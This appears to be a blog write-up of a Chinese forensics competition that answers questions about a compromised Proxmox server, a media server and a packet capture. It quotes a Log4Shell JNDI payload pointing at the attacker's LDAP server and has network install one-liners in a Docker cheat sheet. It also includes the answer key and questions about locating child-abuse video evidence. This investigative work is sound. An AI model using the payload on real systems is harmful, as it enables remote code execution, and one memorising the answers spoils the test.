id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><pre><code>[填空题] AGC_Server里LVM (Logical Volume Management 逻辑卷轴管理) 的 VG (Volume Group 卷组) ‘pve’ 共有多少PE (Physical Extent 物理块) ? (以阿拉伯数字回答) (1分)</code></pre><pre><code>114147</code></pre><p>制作好之后 使用美亚的仿真软件 仿真起服务器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071602117.png" alt="image-20231107160251058"></p><p>登root  查ip 但是发现没有ens33  重新配置网卡</p><pre><code>cd  /etc/networkcat interfaces</code></pre><p>将上面改为下面的配置</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071614896.png" alt="image-20231107161439843"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071614070.png" alt="image-20231107161447037"></p><pre><code>systemctl restart networkingifconfig</code></pre><p>发现有ip了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071615663.png" alt="image-20231107161527610"></p><p>连xshell</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071617674.png" alt="image-20231107161707613"></p><p>下面就可以做题了</p><pre><code>vgdisplay</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071618067.png" alt="image-20231107161803023"></p><h3 id="46"><a href="#46" class="headerlink" title="46"></a>46</h3><pre><code>[填空题] AGC_Server里LVM 的 LV(邏輯卷)“pve-data” 使用了多少百分比的空間? (不用填寫 ‘%’，以阿拉伯数字回答) (3分)</code></pre><pre><code>2</code></pre><pre><code>df -h </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071619813.png" alt="image-20231107161953776"></p><h3 id="47"><a href="#47" class="headerlink" title="47"></a>47</h3><pre><code>[多选题] AGC_Server里的 ‘Proxmox’ 虚拟化环境 (Virtual Environment - VE) 有哪一个用户? (2分)A. rootB. VM_adminC. sysadminD. aclE. tss</code></pre><pre><code>AC</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071626173.png" alt="image-20231107162634130"></p><p>要使用https协议进行登陆网页 访问<code>192.168.70.132:8006</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071628436.png" alt="image-20231107162859381"></p><h3 id="48"><a href="#48" class="headerlink" title="48"></a>48</h3><pre><code>[填空题] 分析 ‘VM’ (虚拟机) 编号 ‘111’ AGC网站的网页服务器日志，当中记录了黑客曾向该服务器发出多少次與远程代码執行 (Remote Code Execution) 的网络攻击？ (以阿拉伯数字回答) (2分)</code></pre><pre><code>17</code></pre><p>UFS导出111的镜像需要会员  使用上面提到的网站仿真起虚拟机 但是不知道root密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071709939.png" alt="image-20231107170944899"></p><p>直接在UFS上手撸  查看<code>/etc/nginx/conf.d/agcom.shop.conf</code>网站配置文件 找到访问失败成功记录文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071711043.png" alt="image-20231107171107988"></p><p>没找到东西  但是在同目录下有很多其他日志</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071713846.png" alt="image-20231107171346799"></p><p>在里面找shell出现的次数  发现是17次</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071719529.png" alt="image-20231107171931469"></p><h3 id="49"><a href="#49" class="headerlink" title="49"></a>49</h3><pre><code>[单选题] 哪一个IP地址尝试登录’VM’ (虚拟机) 编号 ‘111’ 失败次数最多? (1分)A. 38.242.130.207B. 218.92.0.206C. 43.142.93.22D. 121.202.141.105E. 61.238.217.108</code></pre><pre><code>A</code></pre><p>在&#x2F;var&#x2F;log&#x2F;btmp.1和&#x2F;var&#x2F;log&#x2F;btmp中进行翻找 发现<code>38.242.130.207</code>出现的次数更多</p><h3 id="50"><a href="#50" class="headerlink" title="50"></a>50</h3><pre><code>[填空题] 黑客在入侵 ‘VM’ 编号 ‘111’ 后，打算涂改AGC公司的网页，黑客在传送相关档案时所用的端口 (Port) 是什么? (以阿拉伯数字回答) (3分)</code></pre><pre><code>22</code></pre><p>在<code>/usr/AGC/folder</code>中找到黑客就是王景浩上传的文件  index.html中的内容确实表示王景浩篡改了网页</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071744898.png" alt="image-20231107174424838"></p><p>在王景浩的电脑中也发现了它使用scp向AGC服务器中传文件的命令行记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071746905.png" alt="image-20231107174615840"></p><p>scp默认使用的端口也是22</p><h3 id="51"><a href="#51" class="headerlink" title="51"></a>51</h3><pre><code>[多选题] 根据 ‘VM’ 编号 ‘111’ 里的网页服务器 (Web Server) 的设定，访客可从下列哪个网页地址访问这个服务器? (2分)A. localhostB. www.ag.com.shopC. www.agcom.shopD. agcom.shopE. www.agcom.com</code></pre><pre><code>DE</code></pre><p>还是查看配置文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071747322.png" alt="image-20231107174719274"></p><h3 id="52"><a href="#52" class="headerlink" title="52"></a>52</h3><pre><code>[填空题] 黑客曾入侵 ‘VM’ 编号 ‘111’ 里的电邮系统 ‘Xeams’，他登录的时间是? (以unix时间戳回答，格式如:1665049779010) (2分)</code></pre><pre><code>1665049779010</code></pre><p>由王景浩部分可知 其电脑的ip是<code>61.238.217.108</code> 在server1中翻找 发现<code>/$/opt/Xeams/AuditLogs</code>下是Xeatm电邮系统的日志文件 找到王景浩电脑ip的登陆日志 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071834329.png" alt="image-20231107183452280"></p><h3 id="53"><a href="#53" class="headerlink" title="53"></a>53</h3><pre><code>[单选题] 黑客在入侵后盗用AGC员工电邮户口及冒充AGC员工回复了电邮给客户，发出这封电邮的操作系统 (Operating System) 及电邮软件 (Mail Agent) 是什么? (2分)A. Mac OS X 10.15 rv:102.0 Thunderbird/102.3.0B. Mac OS X 10.15 rv:102.0 Thunderbird/91.13.1C. Mac OS X 10.11 rv:91.0 Thunderbird/91.13.1D. Mac OS X 10.11 rv:60.0 Thunderbird/60.9.1E. Windows 10 Pro Outlook 2016</code></pre><pre><code>D</code></pre><p>由52题得知王景浩入侵电邮系统的时间 是在<code>2022-10-06 17:49:39</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071839785.png" alt="image-20231107183914743"></p><p>那我们找发送邮件记录的时间也应当在10月6号17:49:39之后 在<code>/$/opt/Xeams/GoodEmails</code>中找到发送邮件的记录 在这四封邮件中进行寻找</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311072104203.png" alt="image-20231107210420150"></p><p>应该是这封了 伪造邮件骗取钱财 在user-agent中找到信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311072107875.png" alt="image-20231107210718828"></p><h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><pre><code>[单选题] 黑客在 ‘Proxmox’ 里留下了一个被加密了的程序 (Program)，在解密后它的SHA-256哈希值 (Hash Value) 是什么? (2分)A. C89D7A… …8C4E76B. C7141F… …64BF65C. E9433E… …1A5134D. 45CE1C… …79BD4AE. 0ACAA5… …AB7ECE</code></pre><pre><code>0acaa5332a0d035b6f90b12836b6fa84c45af5c76a7bda6f0c6bec77b3ab7ece</code></pre><p>先是下载了三个文件 再将其合并为<code>base.py</code> 再将base.py解base 在重命名 然后使用python运行了这个程序 之后将这两个文件都删除了 但是1 2 3 三个文件没有删除 我们还是可以进行恢复的 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311072131187.png" alt="image-20231107213127127"></p><p>在<code>/$/srv/samba/share/AGC photo</code>(通过看命令行进目录的记录)文件夹下我们可以找到这三个文件 导出 进行恢复</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919375.png" alt="image-20231108091108935"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919324.png" alt="image-20231108091124678"></p><h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><pre><code>[填空题] 承上题，分析程序代码 (Program Code)，上述程序的档案名应该是什么? (不要输入 ‘.’，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) (3分)</code></pre><pre><code>RANSOMWAREVERFINALV2PY</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919210.png" alt="image-20231108090442771"></p><h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><pre><code>[单选题] 于虚拟机 ‘VM’ 编号 ‘111’ 里的档案 ‘\srv\samba\share\AGCphoto\DSC01139.JPG’ ，照片中出现的街道名称是? (2分)A. 河背街B. 沙咀道C. 众安街D. 香车街E. 川龙街</code></pre><pre><code>C</code></pre><p>上题提到的加密脚本 后面被注释的部分就是解密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919512.png" alt="image-20231108092136998"></p><p>在<code>/$/srv/samba/share/AGC photo</code>找到被加密的图片 在<code>/$/tmp</code>找到密钥文件 <code>thekey.key</code>  应该仿真起来 在虚拟机中直接运行就行 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919924.png" alt="image-20231108093250713"></p><h2 id="AGC流媒体服务器"><a href="#AGC流媒体服务器" class="headerlink" title="AGC流媒体服务器"></a>AGC流媒体服务器</h2><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre><code>[填空题] 就AGC集团网络的流媒体服务器 (Media Server)，有多少个本地用户曾经成功登录过? (以阿拉伯数字回答) (1分)</code></pre><pre><code>3</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051255182.png" alt="image-20231105125509127"></p><p>也可以用命令</p><pre><code>sudo last</code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre><code>[填空题] 就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用 ‘ssh’ (Secure Shell)登录过? (以阿拉伯数字回答) (2分)</code></pre><pre><code>3</code></pre><p>一共是3个ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051300471.png" alt="image-20231105130019406"></p><p>也可以用命令</p><pre><code>lastlog</code></pre><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre><code>[填空题] 就上述的本地用户，成功通过 ‘ssh’ 登录过该流媒体服务器多少次? (以阿拉伯数字回答) (3分)</code></pre><pre><code>12</code></pre><p>还是上面那张图 一共是12次</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre><code>[单选题] 试找找记录失败的登录尝试信息. 有以下哪一个名称曾尝试用 ‘ssh:notty’ 登录该流媒体服务器? (2分)A. iamhackerB. hackingC. hackD. hackerE. 以上皆非</code></pre><pre><code>C</code></pre><p><a href="https://blog.csdn.net/weixin_45362982/article/details/103310459?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169916107316800188544660%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169916107316800188544660&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-103310459-null-null.142%5Ev96%5Epc_search_result_base9&utm_term=btmp%E6%98%AF%E4%BB%80%E4%B9%88&spm=1018.2226.3001.4187">认识和分析日志文件</a></p><pre><code>使用 /var/log/btmp文件查看暴力破解系统的用户 /var/log/btmp文件是记录错误登录系统的日志 如果发现/var/log/btmp日志文件比较大，大于1M，就算大了，就说明很多人在暴力破解ssh服务，此日志需要使用lastb程序查看/var/log/wtmp文件的作用 /var/log/wtmp也是一个二进制文件，记录每个用户的登录次数和持续时间等信息。</code></pre><p>我们在备份日志文件中找到<code>btmp</code>日志 就可以查看登录失败的人</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051316550.png" alt="image-20231105131638497"></p><p>也可以使用命令</p><pre><code>lastb -f /home/btmp</code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre><code>[填空题] 就该流媒体服务器的本地用户, 有一个用户名是 ‘S’ 开头的, 该用户的姓氏是什么? (以大写英文回答) (3分)</code></pre><pre><code>LI</code></pre><p>直接进行仿真 这里在仿真的时候要将5个盘全部挂上 不然后面找media的时候会找不到 选择重置密码即可登陆peter和user1的账户时显示需要重置密码 并且密码的长度必须大于8不能是弱密码 那就随便编一个稍微复杂点的密码 <code>96315001</code> 登陆成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051559693.png" alt="image-20231105155929072"></p><p>我们从AGC集团调查报告中 可以获取一点信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051608771.png" alt="image-20231105160837706"></p><p>先连xshell 连的时候直接连root用户就行 密码已经重置为123456了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919270.png" alt="image-20231106194241784"></p><p>上面的调查报告中提到 有<code>lsblk</code>和<code>zpool status</code> 检查一下 都没有问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919187.png" alt="image-20231106194423818"></p><pre><code>lsblk命令的英文是“list block”，即用于列出所有可用块设备的信息，而且还能显示他们之间的依赖关系，但是它不会列出RAM盘的信息。块设备有硬盘，闪存盘，CD-ROM等等。lsblk命令包含在util-linux-ng包中，现在该包改名为util-linux。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919699.png" alt="image-20231106194439043"></p><pre><code>&quot;zpool status&quot;是一个命令行指令，用于检查ZFS存储池的状态。它可以显示存储池的健康状态、错误信息、磁盘状态等信息。如果存储池处于DEGRADED状态，它还可以提供一些修复建议。可以使用不同的选项来获取更详细的信息，例如“-v”选项可以列出带有详细说明的完成错误列表，“-T”选项可以显示时间戳 最后一行errors:No known data errors就是现在服务器中的硬件没有出现问题的</code></pre><p>连上xftp 还是看一下&#x2F;www文件夹 发现是个wordpress的网站 看一下数据库  这玩意好像没密码 直接进去了</p><pre><code>mysqlshow databasesshow columns from wp_usersselect * from wp_users</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919889.png" alt="image-20231106202812883"></p><p>可以看到sammy的姓氏是LI</p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><pre><code>[多选题] 该流媒体服务器是有使用Docker容器 (Docker Container) 的，当中包含以下哪个Docker镜像 (Docker Image) ? (3分)A. apache2B. ubuntuC. centosD. nginxE. hello-worldF. 以上皆非</code></pre><pre><code>BCDE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311051309900.png" alt="image-20231105130919852"></p><p>也可以使用命令</p><pre><code>docker images</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919981.png" alt="image-20231106203131203"></p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><pre><code>[单选题] 就上述的Docker镜像，哪一个镜像在系统上运行中? (2分)A. apache2B. ubuntuC. centosD. nginxE. hello-worldF. 以上皆非</code></pre><pre><code>D</code></pre><pre><code>docker ps -a(查看所有正在运行和运行过的镜像)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919754.png" alt="image-20231106203325294"></p><p>下面说一下docker一把梭</p><pre><code>## 先查看是否有docker-compose，有docker-compose起docker-compose即可docker-composedocker-compose up -d  # 在后台启动服务docker-compose ps   # 查看启动的服docker-compose stop #停止服务docker-compose stop &amp;&amp; docker-compose rm &amp;&amp; docker-compose down## 无docker-compose，手工单独起docker 优先使用历史记录中的命令systemctl start docker 运行dockerdocker version 查看docker版本docker info 显示Docker 系统信息，包括镜像和容器数uname –r 检查内核版本 /etc/docker/daemon.json Docker配置docker images或docker image ls（manage images） 列出所有镜像 docker image ls --no-trunc 不截断IMAGE IDdocker ps 列出所有运行中的容docker ps -a 列出所有容器docker start|stop|restart 启动、停止和重启一个或多个指定容器docker run 镜像名称/id docker run -d 镜像名称/id 后台运行 docker run -it 镜像名称/id /bin/bash 加载shelldocker run -P 随机端口映射docker run -p 指定端口映射--name= &quot;my-worpress&quot; 为容器指定一个名称--net=&quot;bridge&quot; 指定容器的网络连接类型--link=[] 添加链接到另一个容器--volume ,-v 绑定一个卷-v ~/nginx/conf.d:/etc/nginx/conf.d -v ~/nginx/nginx.conf:/etc/nginx/nginx.conf 宿主机绝对路径：容器内绝对路径docker kill 杀死一个或多个指定容器进程docker top 查看一个正在运行容器进程，支持 ps 命令参数docker inspect检查镜像或者容器的参数docker pause 暂停某一容器的所有进程docker exec -it containerID /bin/bash 进入docker容器docker logs 查看容器日志docker cp 容器ID:文件路径 宿主机目录      从容器中拷贝指定文件或者目录到宿主机中docker diff 检查容器里文件结构的更改docker history nginxdocker ps -a --no-trunc/var/lib/docker/container/id/id-json.log 日志--link 在hosts文件增加映射 容器名称 id 对应ipdocker run -d -p 8080:80 nginx-p: 指定端口映射，格式为：主机(宿主)端口:容器端口–volume , -v: 绑定一个数据卷-d: 后台运行容器，并返回容器ID；–name=“redis”: 为容器指定一个名称；-e username=“ritchie”: 设置环境变量；-m :设置容器使用内存最大值；数据卷容器多容器共享数据卷docker run -id --name db_data -v /db_data centos:7 创建数据卷容器docker run -id --name db1 --volumes-from db_data centos:7 挂载docker run -id --name db2 --volumes-from db_data centos:7 挂载 导入导出镜像 docker save docker load容器 docker export docker import （镜像）docker run 来运行网络--net=bridge 默认 桥接NAT--net=host 和主机共享--net=none --net=container=NAME or id 指定共享容器网络--net=my_net 自定义网络## 实在部署可视化管理工具portainer部署portainer（离线）docker save portain-ce:latest -o portainer.tardocker load -i portainer.tardocker run -d -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer-ce:latest部署portainer（在线）docker pull portainer/portainer-cedocker volume create portainer_datadocker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce### 新版宝塔也支持docker管理了，但是会破坏一部分环境，遇到疑难问题时可尝试centos：yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh ed8484becubuntu：wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh ed8484bec</code></pre><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><pre><code>[多选题] 该流媒体服务器是使用 ‘WordPress’ 建站 (Create Website) 的， 就 ‘比特币’ 标题， 有以下的电子邮箱地址曾经留有评论? (2分)A. cn.wordpress.orgB. root58462@mail.qq.comC. hi456@163.comD. root@163.comE. user1@localhost.netF. 以上皆非</code></pre><pre><code>CD</code></pre><p>查看服务器的历史命令可以得知 wordpress这个网站主要是由sammy搭建的  还有很多搭建时的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919998.png" alt="image-20231106204617891"></p><p>mysql apache2服务都用了 检查一下服务是不是都正常开启的</p><pre><code>systemctl status apache2systemctl status mysqld</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919521.png" alt="image-20231106210453841"></p><p>刚刚通过xftp也看到了网站的根目录在&#x2F;www&#x2F;wordpress下 直接访问<code>192.168.70.131/wordpress</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919292.png" alt="image-20231106211545088"></p><p>访问比特币这个网页</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919179.png" alt="image-20231106211606257"></p><p>网页打不开 因为给又分配了一个url </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919911.png" alt="image-20231106211908315"></p><p>改回去就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919287.png" alt="image-20231106212006545"></p><p>但是我们是看不到邮件的 还是翻数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170919885.png" alt="image-20231106212254252"></p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><pre><code>[单选题] 该流媒体服务器里其中一个本地用户是有使用 ‘calendar’ 日历工具的, 日历内曾经提及以下哪个网站? (3分)A. https://weibo.comB. http://www.baidu.comC. https://www.douyin.comD. https://youku.comE. https://www.binance.comF. 以上皆非</code></pre><pre><code>E</code></pre><p>使用user用户登陆服务器 查看calendar 翻一翻 在2022年12月找到一个虚拟交易网的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071044424.png" alt="image-20231107104405330"></p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><pre><code>[单选题] 该流媒体服务器里是有使用磁盘阵列 (RAID) 的, 该设备是使用哪一个 RAID 级别? (请选择最合适的答案) (1分)A. RAID 0B. RAIDz2C. RAIDz3D. RAID 10E. RAID 5F. 以上皆非</code></pre><pre><code>D</code></pre><p>使用上面提到的<code>zpool status</code>命令看一下储存池的状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071057882.png" alt="image-20231107105711821"></p><p>里面提到mirror-0和mirror-1 看起来很像raid10的模式</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071105167.png" alt="image-20231107110508083"></p><p><a href="https://zhuanlan.zhihu.com/p/51170719">raid磁盘阵列是什么</a></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><pre><code>[单选题] 该基本镜像存储池 (Basic Storage Pool) 里储存了一些视频档案, 请找出一段儿童色情影片, 该档案的最后修改时间是什么月份? (2分)A. JunB. JulC. AugD. SepE. OctF. 以上皆非</code></pre><pre><code>D</code></pre><p>在根目录下找到一个<code>media0</code>文件夹  进去之后找到一个<code>迷住了_幼_迷住.mp4</code>视频 就是目标影片 在xftp中能看到最后修改时间是9月</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071114171.png" alt="image-20231107111432001"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071114741.png" alt="image-20231107111424701"></p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><pre><code>[填空题] 承上题，拥有该段儿童色情影片的用户名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答) (1分)</code></pre><pre><code>ROOT</code></pre><p>接上题</p><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><pre><code>[填空题] 就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 https://web3.com，需回答 HTTPSWEB3COM) (2分)</code></pre><pre><code>HTTPSBITLY3XYI8B5</code></pre><p>由上题 得知儿童色情影片的拥有者是root 在查看root用户的历史命令时看到这样一条</p><pre><code>curl -i -o link.html https://bit.ly/3xyi8b5这段命令的作用是使用curl工具从https://bit.ly/3xyi8b5下载文件，并将服务器的响应头信息输出到终端。其中，-i选项表示输出响应头信息，-o选项表示将下载的文件保存为link.html</code></pre><p>找一下link.html  发现<code>/home/peter/link.html</code></p><pre><code>find / -name link.html</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071127013.png" alt="image-20231107112709965"></p><p>访问一下  通过这个<code>moved here</code> 会直接跳转到<code>儿童色情</code>的搜索栏中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071128198.png" alt="image-20231107112836146"></p><p>再将上面的内容解一下url编码 发现<code>儿童色情</code>关键词 说明就是从<code>https://bit.ly/3xyi8b5</code>网站下载的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071130707.png" alt="image-20231107113025657"></p><h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><pre><code>[填空题] 该基本镜像存储池 (pool) 有一个快照 (Snapshot)，快照的名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 media/mediapool@abc123，需回答MEDIAMEDIAPOOLABC123) (1分)</code></pre><pre><code>MEDIASTORAGE@VERESION1</code></pre><p><a href="https://www.cnblogs.com/zhangguosheng1121/p/13389051.html">ZFS文件系统介绍</a></p><p>使用命令</p><pre><code>zfs list -t snapshot</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071138395.png" alt="image-20231107113805347"></p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><pre><code>[填空题] 就上述所找到的基本镜像存储池快照 (Snapshot)，它储存了多少个档案? (以阿拉伯数字回答) (1分)</code></pre><pre><code>24</code></pre><p>找到了快照文件 直接翻在<code>/media0/mediastorage</code>中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311071403715.png" alt="image-20231107140330654"></p><h2 id="AGC流量包"><a href="#AGC流量包" class="headerlink" title="AGC流量包"></a>AGC流量包</h2><h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><pre><code>[单选题] 分析IP地址61.238.217.108向AGC服务器10.0.66.184发送的第一个 ‘GET’ 指令，它请求的统一资源定位系统 (Uniform Resource Locator - URL) 是什么? (1分)A. http://155.137.195.111:8080B. http://www.w3.org/2003/05/soap-envelopeC. http://61.238.217.108:8000D. 以上皆非</code></pre><pre><code>A</code></pre><p>找到61.238.217.108发送的第一个get指令 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920854.png" alt="image-20231106142443955"></p><p>追踪tcp流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920020.png" alt="image-20231106142608226"></p><h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><pre><code>[单选题] IP地址61.238.217.108曾经向AGC服务器10.0.66.184发送 ‘POST’ 指令，它在 ‘HTML Form’ 项目的 ‘uname’ 栏所输入的字符串是什么? (1分)A. rootB. $&#123;jndi:ldap://61.238.217.108:1389/a&#125;C. application/x-www-form-urlencodedD. password</code></pre><pre><code>B</code></pre><p>直接向下翻找 找到第11个流 是攻击机向服务器发送的post指令 找到传入的uname参数的值 进行url解码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920511.png" alt="image-20231106142803413"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920909.png" alt="image-20231106142840573"></p><pre><code>$&#123;jndi:ldap://61.238.217.108:1389/a&#125;</code></pre><h3 id="23"><a href="#23" class="headerlink" title="23"></a>23</h3><pre><code>[单选题] AGC服务器10.0.66.184收到IP地址61.238.217.108的 ‘POST’ 指令后，它执行了哪些行动? (2分)A. 使用端口46858连接IP地址61.238.217.108的LDAP服务器的指定端口B. 于IP地址61.238.217.108下载了Exploit.classC. 使用端口49264连接IP地址61.238.217.108发送同步要求D. 以上皆是</code></pre><pre><code>D</code></pre><p>传入post指令是第11个流 我们继续向下翻找 第13个流是于IP地址61.238.217.108下载了Exploit.class</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920360.png" alt="image-20231106143216426"></p><p>第12个流是使用端口46858连接IP地址61.238.217.108的LDAP服务器的1389端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920576.png" alt="image-20231106143339769"></p><p>第14个流是使用端口49264连接IP地址61.238.217.108发送同步要求  可以看到攻击机通过连接服务器 在其上进行命令行执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920883.png" alt="image-20231106143430174"></p><h3 id="24"><a href="#24" class="headerlink" title="24"></a>24</h3><pre><code>[填空题] 在上述行动后，IP地址61.238.217.108利用哪个端口 (Port) 向AGC服务器10.0.66.184发出指令? (以阿拉伯数字回答) (1分)</code></pre><pre><code>9001</code></pre><p>接上题 </p><h3 id="25"><a href="#25" class="headerlink" title="25"></a>25</h3><pre><code>[多选题] AGC服务器10.0.66.184里有一个AGC目录 (Directory)，它的子目录 (Sub Directory) 包含以下哪一个? (2分)A. AccountingB. PictureC. StaffD. SambashareE. Retail</code></pre><pre><code>ACE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920157.png" alt="image-20231106144124903"></p><h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><pre><code>[多选题] 入侵者迸入AGC服务器10.0.66.184后，他成功执行以下哪些指令? (2分)A. 檢视了readme.txt内容B. 删除了三个档案C. 删除了一个目录 (Directory)D. 替档案改名E. 建立了两个txt档案</code></pre><pre><code>DE</code></pre><p>还是在第14个流中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920829.png" alt="image-20231106144240170"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311170920839.png" alt="image-20231106144308867"></p><h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><pre><code>[单选题] 入侵者曾经传送一个档案到AGC服务器10.0.66.184并将它改名 (Rename)，这个档案的原来名称是什么？ (1分)A. cGhvdG9zT0Zyb2NreQ==B. Finanical.xlsC. readme.txtD. anonymous</code></pre><pre><code>A</code></pre><p>接上题</p><h3 id="28"><a href="#28" class="headerlink" title="28"></a>28</h3><pre><code>[单选题] 承上题，该档案原档的建立日期是什么? (2分)A. 2022-10-21 08:10:30 (UTC+0)B. 2022-10-21 16:19:39 (UTC+0)C. 2022-10-22 08:10:30 (UTC+0)D. 2022-10-22 14:22:06 (UTC+0)E. 2022-10-22 16:19:39(UTC+0)</code></pre><pre><code>C</code></pre><p><img 